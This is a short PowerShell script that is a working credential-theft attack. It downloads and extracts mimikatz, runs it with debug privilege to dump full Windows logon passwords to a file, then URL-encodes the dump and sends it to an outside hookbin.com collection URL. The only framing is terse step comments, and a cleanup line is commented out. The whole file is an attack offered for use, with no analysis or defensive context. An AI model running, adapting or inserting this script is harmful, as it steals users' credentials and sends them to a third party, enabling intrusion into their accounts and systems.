Add-Type -assembly "system.io.compression.filesystem"
Add-Type -AssemblyName System.Web

$uri_hookbin = "https://hookb.in/ZV8Od8Bd"
$repo_path = "$HOME/Desktop/ok"
mkdir $repo_path > $null
$mimikatz_zip_path = "$repo_path/mimikatz.zip"
$mimikatz_path = "$repo_path/mimikatz"

# Downloading And extracting mimikatz
(new-object System.net.WebClient).DownloadFile("https://github.com/gentilkiwi/mimikatz/releases/download/2.1.1-20171220/mimikatz_trunk.zip", $mimikatz_zip_path)
[io.compression.zipfile]::ExtractToDirectory($mimikatz_zip_path, $mimikatz_path)

# Executing
cd $repo_path
mimikatz/x64/mimikatz.exe "privilege::debug" "sekurlsa::logonPasswords full" "exit" > ./output_mimikatz 
echo "DONE"
echo -n "Mimikat output is:"
cat ./output_mimikatz

# Sending output to server
$out = Get-Content ./output_mimikatz
$out_encoded  = [System.Web.HttpUtility]::UrlEncode($out)
(new-object System.net.WebClient).DownloadString("${uri_hookbin}?q=${out_encoded}")

# Cleaning
cd $repo_path/..
#rm -rf $repo_path
